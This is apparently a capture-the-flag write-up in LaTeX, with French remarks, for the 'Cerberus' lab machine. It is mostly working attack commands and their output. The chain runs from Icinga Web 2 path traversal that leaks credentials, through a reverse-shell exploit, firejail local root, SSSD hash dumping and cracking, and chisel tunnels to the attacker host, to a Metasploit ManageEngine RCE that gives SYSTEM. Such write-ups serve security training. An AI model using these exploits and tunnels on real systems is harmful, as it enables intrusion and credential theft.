\chapter{Cerberus}
\begin{itemize}
    \item {\bf technics}: CVE, pivoting
    \item {\bf Components}: firejail, icingaweb2, ADselfservice plus
    \item {\bf tools}: chisel, metasploit
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}

$ nmapz 10.129.190.236
TCP ports found: 8080
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 00:34 CET
Nmap scan report for 10.129.190.236
Host is up (0.027s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2
\end{verbatim}


\subsection{http}

\url{https://github.com/Icinga/icingaweb2/security/advisories/GHSA-5p3f-rh28-8frw}

\href{https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/}{Path
Traversal Vulnerabilities in Icinga Web}²

\begin{verbatim}
$ curl -i http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts
HTTP/1.1 200 OK
Date: Wed, 22 Mar 2023 00:28:49 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
Etag: 40210-125-5f3289e9ec540
Last-Modified: Thu, 26 Jan 2023 10:57:49 GMT
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/plain;charset=UTF-8

127.0.0.1 iceinga.cerberus.local iceinga
127.0.1.1 localhost
172.16.22.1 DC.cerberus.local DC cerberus.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

\end{verbatim}


\begin{verbatim}
$ curl -i  http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/var/www/html/index.php
HTTP/1.1 200 OK
Date: Wed, 22 Mar 2023 01:10:22 GMT
Server: Apache/2.4.52 (Ubuntu)
Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
Etag: 40184-4b-5f5d5440b8c80
Last-Modified: Wed, 01 Mar 2023 11:46:42 GMT
Transfer-Encoding: chunked
Content-Type: text/x-php;charset=UTF-8

<?php
header("Location: http://icinga.cerberus.local:8080/icingaweb2");
?>


$ curl   http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini
[global]
show_stacktraces = "1"
show_application_state_messages = "1"
config_backend = "db"
config_resource = "icingaweb2"
module_path = "/usr/share/icingaweb2/modules/"

[logging]
log = "syslog"
level = "ERROR"
application = "icingaweb2"
facility = "user"

[themes]

[authentication]

$ curl   http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"

$ curl   http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini
[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"


\end{verbatim}

donc on se log avec \verb+matthew / IcingaWebPassword2023+


\url{https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py}

\begin{verbatim}
 python exploit.py -t http://icinga.cerberus.local:8080/icingaweb2/ \
    -I 10.10.16.5 -P 4445 -u matthew -p IcingaWebPassword2023  \
    -e id.pem

\end{verbatim}




\subsection{www-data}

\begin{verbatim}
www-data@icinga:/etc$ cat krb5.conf
cat krb5.conf
[libdefaults]
default_realm = CERBERUS.LOCAL

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        udp_preference_limit = 0
        default_ccache_name = KCM:
# The following encryption type specification will be used by MIT Kerberos
# if uncommented.  In general, the defaults in the MIT Kerberos code are
# correct and overriding these specifications only serves to disable new
# encryption types as they are added, creating interoperability problems.
#
# The only time when you might need to uncomment these lines and change
# the enctypes is if you have local software that will break on ticket
# caches containing ticket encryption types it doesn't know about (such as
# old versions of Sun Java).

#       default_tgs_enctypes = des3-hmac-sha1
#       default_tkt_enctypes = des3-hmac-sha1
#       permitted_enctypes = des3-hmac-sha1

# The following libdefaults parameters are only for Heimdal Kerberos.
#       fcc-mit-ticketflags = true
#udp_preference_limit = 0

[realms]
        CERBERUS.LOCAL = {
                kdc = DC.cerberus.local
                admin_server = DC.cerberus.local
        }

[domain_realm]
        .cerberus.local = CERBERUS.LOCAL

\end{verbatim}



\href{https://seclists.org/oss-sec/2022/q2/188}{irejail: local root exploit
reachable via --join logic (CVE-2022-31214)}

\begin{verbatim}

www-data@icinga:/dev/shm$ python3 firejoin.py
python3 firejoin.py
You can now run 'firejail --join=1414' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.




www-data@icinga:/dev/shm$ firejail --join=1414
firejail --join=1414
changing root to /proc/1414/root
Warning: cleaning all supplementary groups
Child process initialized in 17.59 ms
www-data@icinga:/dev/shm$ su -
su -
root@icinga:~#
 
\end{verbatim}





\begin{verbatim}
root@icinga:/etc/sssd# cat sssd.conf
cat sssd.conf

[sssd]
domains = cerberus.local
config_file_version = 2
services = nss, pam

[domain/cerberus.local]
default_shell = /bin/bash
ad_server = cerberus.local
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = CERBERUS.LOCAL
realmd_tags = manages-system joined-with-adcli
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = cerberus.local
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad


# strings  /var/lib/sss/db/cache_cerberus.local.ldb

name
matthew@cerberus.local
objectCategory
user
uidNumber
1000
isPosix
TRUE
lastUpdate
1677672476
dataExpireTimestamp
initgrExpireTimestamp
cachedPassword
$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
cachedPasswordType
lastCachedPassw
\end{verbatim}


\begin{verbatim}
$ john -wordlist=/usr/share/wordlists/passwords/rockyou.txt hash
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)

\end{verbatim}


\begin{verbatim}
$ ./chisel server -p 7777 --reverse
2023/03/23 21:45:51 server: Reverse tunnelling enabled


bash-5.1# ./chisel client 10.10.16.5:7777 R:5985:172.16.22.1:5985
./chisel client 10.10.16.5:7777 R:5985:172.16.22.1:5985

$ evil-winrm -i 10.10.16.5 -u matthew -p 147258369
fatal: detected dubious ownership in repository at '/usr/share/evil-winrm'
To add an exception for this directory, call:

 git config --global --add safe.directory /usr/share/evil-winrm

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\matthew\Documents>


\end{verbatim}





\begin{verbatim}

*Evil-WinRM* PS C:\Users\matthew\Documents> ./Seatbelt.exe InstalledProducts


====== InstalledProducts ======

  DisplayName                    : Google Chrome
  DisplayVersion                 : 110.0.5481.178
  Publisher                      : Google LLC
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86

  DisplayName                    : ADSelfService Plus
  DisplayVersion                 : 6.2
  Publisher                      : ZOHO Corp.
  InstallDate                    : 1/1/0001 12:00:00 AM
  Architecture                   : x86


\end{verbatim}



\begin{verbatim}
$ echo "127.16.22.1 dc.cerberus.local" | sudo tee -a /etc/hosts

*Evil-WinRM* PS C:\Users\matthew\Documents> ./chisel.exe client 10.10.16.5:7777 R:4443:127.0.0.1:443


$ curl -i -k https://dc.cerberus.local:4443
HTTP/1.1 404 Not Found

\end{verbatim}

visiblement par defaut le port du serveur web est 9251

\begin{verbatim}
$ proxychains curl -i -k https://dc.cerberus.local:9251
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.16.22.1:9251  ...  OK
HTTP/1.1 200

\end{verbatim}

\begin{verbatim}
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set Proxies 10.10.16.5:1080
Proxies => 10.10.16.5:1080
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set RHOSTS 172.16.22.1
RHOSTS => 172.16.22.1
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set LHOST tun0
LHOST => 10.10.16.5
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set RPORT 9251
RPORT => 9251
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
GUID => 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
msf6 exploit(multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966) > set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
ISSUER_URL => http://dc.cerberus.local/adfs/services/trust


meterpreter > getuid
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
Server username: NT AUTHORITY\SYSTEM

\end{verbatim}



\begin{verbatim}
meterpreter > powershell_execute 'net localgroup administrators matthew /add'

\end{verbatim}

